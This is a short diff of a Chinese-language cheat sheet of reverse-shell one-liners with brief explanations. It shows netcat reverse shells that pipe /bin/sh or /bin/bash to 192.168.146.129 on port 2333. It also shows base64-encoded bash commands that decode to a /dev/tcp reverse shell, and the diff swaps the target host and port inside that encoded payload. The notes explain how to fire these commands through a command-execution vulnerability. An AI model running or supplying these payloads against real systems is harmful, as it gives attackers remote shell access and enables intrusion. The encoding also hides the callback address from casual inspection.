@@ -1170,7 +1170,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.146.129 2333 >/tmp
 mknod backpipe p; nc 192.168.146.129 2333 0<backpipe | /bin/bash 1>backpipe 2>backpipe
 
 补充：
-1、bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMzEuNTAuNTcvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}
+1、bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMjQuMTE1LjQvNTU1NSAwPiYx}|{base64,-d}|{bash,-i}
 
 解释：
 bash -c只是在当前漏洞环境需要，依靠漏洞在这个应用中执行任意命令时需要，如果本身就在bash中的话是不用写的
@@ -1181,7 +1181,7 @@ leixiao@LAPTOP-H4MNA5DT:~$ bash -c "echo hello"
 hello
 
 
-2、{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMzEuNTAuNTcvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}
+2、{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMjQuMTE1LjQvNTU1NSAwPiYx}|{base64,-d}|{bash,-i}
 
 解释：
 {bash,-i}：相当于开了一个新的shell 去执行所输入的内容(stdin)，
